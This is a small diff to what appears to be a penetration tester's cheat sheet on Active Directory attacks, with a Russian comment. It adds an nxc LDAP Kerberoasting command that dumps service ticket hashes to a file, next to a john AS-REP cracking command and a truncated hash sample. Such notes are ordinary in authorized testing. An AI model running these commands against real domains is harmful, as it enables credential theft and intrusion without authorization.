@@ -9,6 +9,7 @@ john --format=krb5asrep --wordlist=/home/user/Desktop/rockyou2024_printable_8-40
 
 
 Kerberoasting 
+nxc ldap dc01.domain.local -u 'user' -p  'password' --kerberoasting kerberoast.txt
 собираем хэши все в один файл kerberoast.txt
 
 $krb5tgs$23$*srv$domain.LOCAL$domain.local/tgs_srv*$73ce6a13722cc5501d4506e7c3
